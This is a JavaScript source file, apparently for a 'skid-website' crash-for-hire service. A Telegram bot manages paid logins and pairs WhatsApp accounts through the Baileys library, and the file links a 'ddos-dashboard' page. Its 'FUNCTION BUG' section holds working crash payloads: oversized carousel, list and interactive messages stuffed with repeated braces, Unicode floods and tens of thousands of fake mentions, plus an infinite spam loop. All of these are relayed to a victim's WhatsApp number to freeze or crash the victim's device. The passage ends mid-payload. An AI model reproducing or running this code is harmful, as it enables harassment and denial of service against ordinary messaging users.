const { Token, owner } = require("./config");
const express = require("express");
const fs = require("fs");
const path = require("path");
const cookieParser = require('cookie-parser');
const cors = require('cors');
const crypto = require('crypto');
const {
    default: makeWASocket,
    makeInMemoryStore,
    useMultiFileAuthState,
    useSingleFileAuthState,
    initInMemoryKeyStore,
    fetchLatestBaileysVersion,
    makeWASocket: WASocket,
    getGroupInviteInfo,
    AuthenticationState,
    BufferJSON,
    downloadContentFromMessage,
    downloadAndSaveMediaMessage,
    generateWAMessage,
    generateMessageID,
    generateWAMessageContent,
    encodeSignedDeviceIdentity,
    generateWAMessageFromContent,
    prepareWAMessageMedia,
    getContentType,
    mentionedJid,
    relayWAMessage,
    templateMessage,
    InteractiveMessage,
    Header,
    MediaType,
    MessageType,
    MessageOptions,
    MessageTypeProto,
    WAMessageContent,
    WAMessage,
    WAMessageProto,
    WALocationMessage,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMediaUpload,
    WAMessageStatus,
    WA_MESSAGE_STATUS_TYPE,
    WA_MESSAGE_STUB_TYPES,
    Presence,
    emitGroupUpdate,
    emitGroupParticipantsUpdate,
    GroupMetadata,
    WAGroupMetadata,
    GroupSettingChange,
    areJidsSameUser,
    ChatModification,
    getStream,
    isBaileys,
    jidDecode,
    processTime,
    ProxyAgent,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    Browsers,
    Browser,
    WAFlag,
    WAContextInfo,
    WANode,
    WAMetric,
    Mimetype,
    MimetypeMap,
    MediaPathMap,
    isJidUser,
    DisconnectReason,
    MediaConnInfo,
    ReconnectMode,
    AnyMessageContent,
    waChatKey,
    WAProto,
    BaileysError,
} = require('@whiskeysockets/baileys');
const pino = require("pino");
const { Telegraf, Markup } = require("telegraf");

const app = express();
const PORT = process.env.PORT || 5000;

app.use(express.json());
app.use(express.static('public'));
app.use(cookieParser());
app.use(cors());

const file_session = "./sessions.json";
const sessions_dir = "./sessions";
const sessions = new Map();
const bot = new Telegraf(Token);

// Load accounts from acc.json
const loadAccounts = () => {
  try {
    const data = fs.readFileSync('./acc.json', 'utf8');
    return JSON.parse(data);
  } catch (error) {
    console.error('Error loading accounts:', error);
    return [];
  }
};

// Generate JWT-like token
const generateToken = (user) => {
  const payload = {
    username: user.username,
    role: user.role,
    timestamp: Date.now()
  };
  return Buffer.from(JSON.stringify(payload)).toString('base64');
};

// Verify token
const verifyToken = (token) => {
  try {
    const payload = JSON.parse(Buffer.from(token, 'base64').toString());
    const accounts = loadAccounts();
    const user = accounts.find(acc => acc.username === payload.username);
    return user ? payload : null;
  } catch (error) {
    return null;
  }
};

// Authentication middleware
const requireAuth = (req, res, next) => {
  const token = req.headers.authorization?.replace('Bearer ', '');
  const payload = verifyToken(token);

  if (!payload) {
    return res.status(401).json({ success: false, message: 'Unauthorized' });
  }

  req.user = payload;
  next();
};

// Web routes
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

app.get('/ddos-dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'ddos-dashboard.html'));
});

// Helper function to check if account is expired
const isAccountExpired = (expired) => {
  if (!expired) return false;

  const now = new Date();
  const expiryDate = parseExpiryDate(expired);

  return now > expiryDate;
};

// Helper function to parse expiry date (1d, 1h, etc.)
const parseExpiryDate = (expired) => {
  if (!expired) return new Date(Date.now() + 365 * 24 * 60 * 60 * 1000); // 1 year default

  const regex = /^(\d+)([dhmy])$/i;
  const match = expired.match(regex);

  if (!match) return new Date(expired); // Try parsing as regular date

  const value = parseInt(match[1]);
  const unit = match[2].toLowerCase();
  const now = new Date();

  switch (unit) {
    case 'd': return new Date(now.getTime() + value * 24 * 60 * 60 * 1000);
    case 'h': return new Date(now.getTime() + value * 60 * 60 * 1000);
    case 'm': return new Date(now.getTime() + value * 30 * 24 * 60 * 60 * 1000);
    case 'y': return new Date(now.getTime() + value * 365 * 24 * 60 * 60 * 1000);
    default: return new Date(now.getTime() + 24 * 60 * 60 * 1000); // 1 day default
  }
};

// Function to clean expired accounts
const cleanExpiredAccounts = () => {
  const accounts = loadAccounts();
  const validAccounts = accounts.filter(acc => !isAccountExpired(acc.expired));

  if (validAccounts.length !== accounts.length) {
    fs.writeFileSync('./acc.json', JSON.stringify(validAccounts, null, 2));
    console.log(`Removed ${accounts.length - validAccounts.length} expired accounts`);
  }
};

// Clean expired accounts on startup and every hour
cleanExpiredAccounts();
setInterval(cleanExpiredAccounts, 60 * 60 * 1000);

// API routes
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  const accounts = loadAccounts();

  const user = accounts.find(acc => acc.username === username && acc.password === password);

  if (user) {
    // Check if account is expired
    if (isAccountExpired(user.expired)) {
      // Remove expired account
      const updatedAccounts = accounts.filter(acc => acc.username !== username);
      fs.writeFileSync('./acc.json', JSON.stringify(updatedAccounts, null, 2));

      return res.status(401).json({
        success: false,
        message: 'Account has expired'
      });
    }

    // Ensure role is either ADMIN or VIP
    const validRole = ['ADMIN', 'VIP'].includes(user.role.toUpperCase()) ? user.role.toUpperCase() : 'VIP';

    const token = generateToken(user);
    res.json({
      success: true,
      token,
      user: {
        username: user.username,
        role: validRole,
        expired: user.expired
      }
    });
  } else {
    res.status(401).json({
      success: false,
      message: 'Invalid credentials'
    });
  }
});

const saveActive = (botNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(botNumber)) {
    list.push(botNumber);
    fs.writeFileSync(file_session, JSON.stringify(list));
  }
};

const sessionPath = (botNumber) => {
  const dir = path.join(sessions_dir, `device${botNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

  for (const botNumber of activeNumbers) {
    console.log(`Menghubungkan WhatsApp: ${botNumber}`);
    const sessionDir = sessionPath(botNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    const sock = makeWASocket({
      auth: state,
      printQRInTerminal: true,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
      if (connection === "open") {
        console.log(`Bot ${botNumber} terhubung!`);
        sessions.set(botNumber, sock);
      }
      if (connection === "close") {
        const reconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
        if (reconnect) {
          console.log(`Koneksi ditutup untuk ${botNumber}, mencoba menghubungkan kembali...`);
          sessions.delete(botNumber);
          await connectToWhatsApp(botNumber, null, null);
        } else {
          console.log(`Sesi ${botNumber} keluar.`);
          sessions.delete(botNumber);
          fs.rmSync(sessionDir, { recursive: true, force: true });
          const data = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
          const updated = data.filter(n => n !== botNumber);
          fs.writeFileSync(file_session, JSON.stringify(updated));
        }
      }
    });
    sock.ev.on("creds.update", saveCreds);
  }
};

const connectToWhatsApp = async (botNumber, chatId, ctx) => {
  const sessionDir = sessionPath(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage;
  if (ctx) {
    statusMessage = await ctx.reply(`pairing with number *${botNumber}*...`, {
      parse_mode: "Markdown"
    });
  }

  const editStatus = async (text) => {
    if (ctx && chatId && statusMessage) {
      try {
        await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, {
          parse_mode: "Markdown"
        });
      } catch (e) {
        console.error("Gagal edit pesan:", e.message);
      }
    } else {
      console.log(text);
    }
  };

  let paired = false;

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "connecting") {
      if (!fs.existsSync(`${sessionDir}/creds.json`)) {
        setTimeout(async () => {
          try {
            const code = await sock.requestPairingCode(botNumber);
            const formatted = code.match(/.{1,4}/g)?.join("-") || code;
            await editStatus(makeCode(botNumber, formatted));
          } catch (err) {
            console.error("Error requesting code:", err);
            await editStatus(makeStatus(botNumber, `❗ ${err.message}`));
          }
        }, 3000);
      }
    }

    if (connection === "open" && !paired) {
      paired = true;
      sessions.set(botNumber, sock);
      saveActive(botNumber);
      await editStatus(makeStatus(botNumber, "✅ Connected successfully."));
    }

    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code !== DisconnectReason.loggedOut && code >= 500) {
        console.log(`Reconnect diperlukan untuk ${botNumber}`);
        setTimeout(() => connectToWhatsApp(botNumber, chatId, ctx), 2000);
      } else {
        await editStatus(makeStatus(botNumber, "❌ Failed to connect."));
        fs.rmSync(sessionDir, { recursive: true, force: true });
        sessions.delete(botNumber);
        const data = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
        const updated = data.filter(n => n !== botNumber);
        fs.writeFileSync(file_session, JSON.stringify(updated));
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
};

const makeStatus = (number, status) =>
  `*Status Pairing*\nNomor: \`${number}\`\nStatus: ${status}`;

const makeCode = (number, code) =>
  `*Kode Pairing*\nNomor: \`${number}\`\nKode: \`${code}\``;

// ====================== BOT TELEGRAM ======================
bot.use(async (ctx, next) => {
  ctx.isOwner = ctx.from?.id?.toString() === owner;
  return next();
});

bot.start((ctx) => {
  ctx.replyWithVideo(
    { url: 'https://files.catbox.moe/tcv2pi.mp4' },
    {
      caption: `
welcome to skid-website, i can only help with this

╭─────────
│ 🔹 /create <username> <password> <role> <expired>
│ 🔹 /listakun
│ 🔹 /delakun <username>
│ 🔹 /pairing <number>
│ 🔹 /listpairing
│ 🔹 /delpairing <number>
╰──────────`,
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.url('👤 Owner', 'https://t.me/Dimzxzzx')],
        [Markup.button.url('📢 Join Channel', 'https://t.me/xpxteams')]
      ])
    }
  );
});

bot.command("create", async (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ You don't have access.");

  const args = ctx.message.text.split(" ");
  if (args.length < 4) {
    return ctx.reply(`Use: \`/create <username> <password> <role> <expired>\`

*Valid roles:* ADMIN, VIP
*Expired format:* 1d=1 day, 1h=1 hour, 1m=1 month, 1y=1 year
*Example:* \`/create user123 pass123 VIP 30d\``, { parse_mode: "Markdown" });
  }

  const [, username, password, role, expired] = args;
  const accounts = loadAccounts();

  // Validate role
  const validRoles = ['ADMIN', 'VIP'];
  if (!validRoles.includes(role.toUpperCase())) {
    return ctx.reply("❌ Invalid role! Use: ADMIN or VIP");
  }

  // Check if username already exists
  if (accounts.find(acc => acc.username === username)) {
    return ctx.reply("❌ Username already exists.");
  }

  // Validate expired format if provided
  if (expired && expired !== "" && !expired.match(/^(\d+)([dhmy])$/i)) {
    return ctx.reply("❌ Invalid expired format! Use: 1d, 1h, 1m, 1y (d=day, h=hour, m=month, y=year)");
  }

  // Add new account
  accounts.push({
    username,
    password,
    role: role.toUpperCase(),
    expired: expired || ""
  });

  // Save to acc.json
  fs.writeFileSync('./acc.json', JSON.stringify(accounts, null, 2));

  const expiryText = expired ? `Expires in: ${expired}` : "Never expires";

  ctx.reply(`
╭─────────────────────╮
┃✅ Account created successfully!
┃👤 Username: \`${username}\`
┃🔑 Password: \`${password}\`
┃👑 Role: \`${role.toUpperCase()}\`
┃⏰ ${expiryText}
╰─────────────────────╯`, { parse_mode: "Markdown" });
});

bot.command("listakun", (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ You don't have access.");

  const accounts = loadAccounts();
  if (accounts.length === 0) {
    return ctx.reply("No accounts found.");
  }

  const list = accounts.map((acc, index) => 
    `${index + 1}. ${acc.username} (${acc.role}) - ${acc.expired || "Never expires"}`
  ).join("\n");

  ctx.reply(`*Account List:*\n${list}`, { parse_mode: "Markdown" });
});

bot.command("delakun", async (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ You don't have access.");

  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Use: /delakun <username>");

  const username = args[1];
  const accounts = loadAccounts();
  const initialLength = accounts.length;
  const updatedAccounts = accounts.filter(acc => acc.username !== username);

  if (updatedAccounts.length === initialLength) {
    return ctx.reply("❌ Username not found.");
  }

  fs.writeFileSync('./acc.json', JSON.stringify(updatedAccounts, null, 2));
  ctx.reply(`✅ Account ${username} deleted successfully.`);
});

bot.command("pairing", async (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ You don't have access.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Use: `/pairing <number>`", { parse_mode: "Markdown" });
  const botNumber = args[1];
  await ctx.reply(`⏳ Starting pairing to number ${botNumber}...`);
  await connectToWhatsApp(botNumber, ctx.chat.id, ctx);
});

bot.command("listpairing", (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ You don't have access.");
  if (sessions.size === 0) return ctx.reply("no active sender.");
  const list = [...sessions.keys()].map(n => `• ${n}`).join("\n");
  ctx.reply(`*Active Sender List:*\n${list}`, { parse_mode: "Markdown" });
});

bot.command("delpairing", async (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ You don't have access.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Use: /delpairing 628xxxx");

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender not found.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    const updated = data.filter(n => n !== number);
    fs.writeFileSync(file_session, JSON.stringify(updated));

    ctx.reply(`Sender ${number} successfully deleted.`);
  } catch (err) {
    console.error(err);
    ctx.reply("Failed to delete sender.");
  }
});

// ====================== FUNCTION BUG ======================
async function ioscrash(skid, jid) {
  const mention = [];
  const cards = [];
  const header = {
     videoMessage: {
       url: "https://mmg.whatsapp.net/v/t62.7161-24/21602184_2832961610425267_5849197637611598520_n.enc?ccb=11-4&oh=01_Q5Aa1wGka8VubJ__PC7eG6QnM2drUGuJv4_eFHNTZM7JysUEYA&oe=688CAD10&_nc_sid=5e03e0&mms3=true",
       mimetype: "video/mp4",
       fileSha256: "/pV21pNhkihyDh9p3Hq5wt7yhm8936pnjQqKre9lKpY=",
       fileLength: 3714175,
       seconds: 19,
       mediaKey: "LQ4w55EW8uoSwW/K7ejT0X++UhZIvP8pqrFkO7B/e50=",
       height: 576,
       width: 768,
       fileEncSha256: "BKuE23WWqS72GgIoJHmTGefyqUADW2hdeIlUBa15Oh4=",
       directPath: "/v/t62.7161-24/21602184_2832961610425267_5849197637611598520_n.enc?ccb=11-4&oh=01_Q5Aa1wGka8VubJ__PC7eG6QnM2drUGuJv4_eFHNTZM7JysUEYA&oe=688CAD10&_nc_sid=5e03e0&mms3=true",
       mediaKeyTimestamp: "1751466051",
       jpegThumbnail: "",
       contextInfo: {},
       streamingSidecar: "ypvxlTyuR3uzb1giNyNVUaHeJ40v9lL2IjwfM8njf+m2lvqWGcKb6L6IRiH6TiajAWpnj2z4ZsC6klWL6l2NkB65g8U+qXMyjADFSGOuG9LBI/jmx7h9vlpXjSgxZOLVy29HBS2vhjj8V1IglDR47GrAz0UZqcDuotGa/vJmSg5lKMpxxJqzvJth0h4spVX2pcH2aIVZnWkaHh2a+7BukY6hXN1A/or+VvhZyauto6anYMWAcnACcWP9dyBKYa1B7Ss7Vnu86uqUbQmyyNgePCipB9sundP9iq4RHBiR1RxIfrv990U+hYUPE0kbBtD1zfK9x+gmf1I9Cav0sP64xnWQ8TrhalUjTE2mVFfQqn8ZkY4IKwOpOgWzacImLK6j0Pj78jyibNShmDBlmG61QOMKfwVW4ZDw3M7kI1/1TJ3uKBXYzLlAs36BowfErSIrgEbU+OSA1g2Ay4qwH+k5mjkOLVnW3dshIjCdxsHUTTLQpQGnBrh+sARmOWL8UHjJOKCh/7lQZqx3Vv7ZOt13ry44AR2aRPEO7VkYpX4oOWhKyjJIgHpZXPddrZLL3s/yGVecfpP9F80HfuB5ieery0Ai0klbruXlB9JDrd2w2477587Djifcsqqdqwurc6DTvWaEaTZTCsHMAyuCCOLIoTY0fWvotA7oIW/eVYb8LwdJzjzVbswVl4XoWkc+nJBKJFcQ7PE/kRKe6aWyqARaY/XxPUmLrEWPrqLbn1yY8a6yICH2dmq+3Sf5"
    },
    hasMediaAttachment: false,
    contextInfo: {
      isGroupMention: true,
      mentionedJid: mention,
      forwardingScore: 777,
      isForwarded: true,
      stanzaId: "DimzxzzxXP" + Date.now(),
      participant: jid,
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "{ skid-wa.json }",
          nativeFlowResponseMessage: {
          name: "review_and_pay",
          paramsJson: "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"Zeppeli\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Joestar\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"Yuukey Da\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}",
          version: 3
          },
          contextInfo: {
            mentionedJid: [jid],
            externalAdReply: {
              title: "{ skid-wa.json }",
              body: "",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "https://nekopoi/care",
              showAdAttribution: false
            }
          }
        }
      }
    }
  };

  for (let y = 0; y < 160; y++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000)
      }
    });
  }

  const msg = generateWAMessageFromContent(
    jid,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "{ skid-wa.json }"
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              isGroupMention: true,
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550202@s.whatsapp.net"
              },
              stanzaId: "DimzxzzxXP" + "-Id" + Math.floor(Math.random() * 99999),
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: [jid],
              externalAdReply: {
                title: "{ skid-wa.json }",
                body: "",
                thumbnailUrl: "https://nekopoi/care",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://bokep.id/babi?exambling=dimz",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await skid.relayMessage(jid, msg.message, {
    participant: jid,
    messageId: msg.key.id
  });
}

async function FlowXCall(jid) {
  const names = ["mpm", "single_select", "call_permission_request", "galaxy_message"];

  while (true) {
    for (const name of names) {
      let msg = await generateWAMessageFromContent(
        jid,
        {
          viewOnceMessage: {
            message: {
              interactiveMessage: {
                header: {
                  title: "Amvasss",
                  hasMediaAttachment: false,
                },
                body: {
                  text: "🧬⃟𝐋͢𝐮͡𝐛͜𝐢͢𝐗͜𝐍͡𝐞͡𝐯͜𝐞͢𝐫͡𝐃͢𝐢͜𝐞͡꙳⟅",
                },
                nativeFlowInfo: {
                  name: name,
                  paramsJson: "(".repeat(99),
                },
              },
            },
          },
        },
        {}
      );

      const sock = sessions.values().next().value; // Get the first socket from sessions
      if (sock) {
        await sock.relayMessage(jid, msg.message, {
          messageId: null,
          participant: { jid: jid },
        });
      }
    }
  }
}

async function crash(sock, target) {
  let InJectXploit = JSON.stringify({
    status: true,
    criador: "yukina",
    resultado: {
      type: "md",
      ws: {
        _events: {
          "CB:ib,,dirty": ["Array"]
        },
        _eventsCount: 800000,
        _maxListeners: 0,
        url: "wss://web.whatsapp.com/ws/chat",
        config: {
          version: ["Array"],
          browser: ["Array"],
          waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
          sockCectTimeoutMs: 20000,
          keepAliveIntervalMs: 30000,
          logger: {},
          printQRInTerminal: false,
          emitOwnEvents: true,
          defaultQueryTimeoutMs: 60000,
          customUploadHosts: [],
          retryRequestDelayMs: 250,
          maxMsgRetryCount: 5,
          fireInitQueries: true,
          auth: { Object: "authData" },
          markOnlineOnsockCect: true,
          syncFullHistory: true,
          linkPreviewImageThumbnailWidth: 192,
          transactionOpts: { Object: "transactionOptsData" },
          generateHighQualityLinkPreview: false,
          options: {},
          appStateMacVerification: { Object: "appStateMacData" },
          mobile: true
        }
      }
    }
  });

  try {
    const Byte = {
      contextInfo: {
        remoteJid: "status@broadcast",
        fromMe: false,
        mentionedJid: [target, "13135550002@s.whatsapp.net"],
        forwardingScore: 9999,
        isForwarded: true,
        businessMessageForwardInfo: {
          businessOwnerJid: target
        },
        quotedMessage: {
          documentMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
            fileLength: "9999999999999",
            pageCount: 1316134911,
            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
            fileName: "ZynXzo New",
            fileEncSha256: "LEodIdRH8WvgW6mHqvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
            directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1726867151",
            contactVcard: true,
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAOQMBIgACEQEDEQH/xAAvAAACAwEBAAAAAAAAAAAAAAACBAADBQEGAQADAQAAAAAAAAAAAAAAAAABAgMA/9oADAMBAAIQAxAAAAA87YUMO16iaVwl9FSrrywQPTNV2zFomOqCzExzltc8uM/lGV3zxXyDlJvj7RZJsPibRTWvV0qy7dOYo2y5aeKekTXvSVSwpCODJB//xAAmEAACAgICAQIHAQAAAAAAAAABAgADERIEITETUgUQFTJBUWEi/9oACAEBAAE/ACY7EsTF2NAGO49Ni0kmOIflmNSr+Gg4TbjvqaqizDX7ZJAltLqTlTCkKTWehaH1J6gUqMCBQcZmoBMKAjBjcep2xpLfh6H7TPpp98t5AUyu0WDoYgOROzG6MEAw0xENbHZ3lN1O5JfAmyZUqcqYSI1qjow2KFgIIyJq0Whz56hTQfcDKbioCmYbAbYYjaWdiIucZ8SokmwA+D1P9e6WmweWiAmcXjC5G9wh42HClusdxERBqFhFZUjWVKAGI/cysDknzK2wO5xbLWBVOpRVqSScmEfyOoCk/wAlC5rmgiyih7EZ/wACca96wcQc1wIvOs/IEfm71sNDFZxUuDPWf9z/xAAdEQEBAQACAgMAAAAAAAAAAAABABECECExEkFR/9oACAECAQE/AHC4vnfqXelVsstYSdb4z7jvlz4b7lyCfBYfl//EAB4RAAMBAAICAwAAAAAAAAAAAAABEQIQEiFRMWFi/9oACAEDAQE/AMtNfZjPW8rJ4QpB5Q7DxPkqO3pGmUv5MrU4hCv2f//Z",
          }
        }
      },
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            body: { text: "NullByte🩸" },
            footer: { text: "DimzxzzxXP x Yukina" },
            header: {
              title: "×",
              hasMediaAttachment: false
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: InJectXploit
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: InJectXploit + "{"
                }
              ]
            }
          },
          extendedTextMessage: {
            text: "ꦾ".repeat(20000) + "@1".repeat(20000),
            contextInfo: {
              stanzaId: "xpxteams-Id" + Math.floor(Math.random() * 99999),
              participant: target,
              quotedMessage: {
                conversation: "✧𖤐☽YΔ7✦" + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(20000),
              }
            }
          }
        }
      }
    };

    const jawa = await sock.relayMessage(
      target,
      Byte,
      { messageId: generateMessageID() }
    );

    // Check if jawa and jawa.key are defined before accessing jawa.key.id
    if (jawa && jawa.key) {
      await sock.relayMessage(target, {
        protocolMessage: {
          type: 0,
          key: {
            remoteJid: target,
            fromMe: true,
            id: jawa.key.id,
            participant: jawa.key.participant || target
          }
        }
      }, { messageId: generateMessageID() });
    } else {
      console.error("Error: jawa or jawa.key is undefined. Cannot relay protocol message.");
    }

  } catch (err) {
    console.error("Crash error:", err);
  }
}

async function delay(skid, jid, mention = true) {
  const delaymention = Array.from({ length: 30000 }, (_, r) => ({
    title: "᭡꧈".repeat(95000),
    rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
  }));

  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "sayonara...",
          listType: 2,
          buttonText: null,
          sections: delaymention,
          singleSelectReply: { selectedRowId: "🔴" },
          contextInfo: {
            mentionedJid: Array.from({ length: 30000 }, () => 
              "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: jid,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "333333333333@newsletter",
              serverMessageId: 1,
              newsletterName: "-"
            }
          },
          description: "Hp Kentang Dilarang Coba²"
        }
      }
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2
    }
  };

  const msg = generateWAMessageFromContent(jid, MSG, {});

  await skid.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: jid },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

  // Check if mention is true before running relayMessage
  if (mention) {
    await skid.relayMessage(
      jid,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "kontol lor" },
            content: undefined
          }
        ]
      }
    );
  }
}

async function Carouselspam(sock, isTarget) {
  const cardsX = {
    header: {
      imageMessage: {
        url: "https://mmg.whatsapp.net/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0&mms3=true",
        mimetype: "image/jpeg",
        fileSha256: "5u7fWquPGEHnIsg51G9srGG5nB8PZ7KQf9hp2lWQ9Ng=",
        fileLength: "211396",
        height: 816,
        width: 654,
        mediaKey: "LjIItLicrVsb3z56DXVf5sOhHJBCSjpZZ+E/3TuxBKA=",
        fileEncSha256: "G2ggWy5jh24yKZbexfxoYCgevfohKLLNVIIMWBXB5UE=",
        directPath: "/v/t62.7118-24/382902573_734623525743274_3090323089055676353_n.enc?ccb=11-4&oh=01_Q5Aa1gGbbVM-8t0wyFcRPzYfM4pPP5Jgae0trJ3PhZpWpQRbPA&oe=686A58E2&_nc_sid=5e03e0&mms3=true",
        mediaKeyTimestamp: "1749220174",
        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsb..."
      },
      hasMediaAttachment: true
    },
    body: {
      text: ""
    },
    nativeFlowMessage: {
      messageParamsJson: "{ X.json }"
    }
  };

  const message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: false
          },
          body: {
            text: "/u0000".repeat(10000)
          },
          footer: {
            text: "/u0000".repeat(10000)
          },
          carouselMessage: {
            cards: [cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX, cardsX]
          },
          contextInfo: {
            participant: isTarget,
            quotedMessage: {
              viewOnceMessage: {
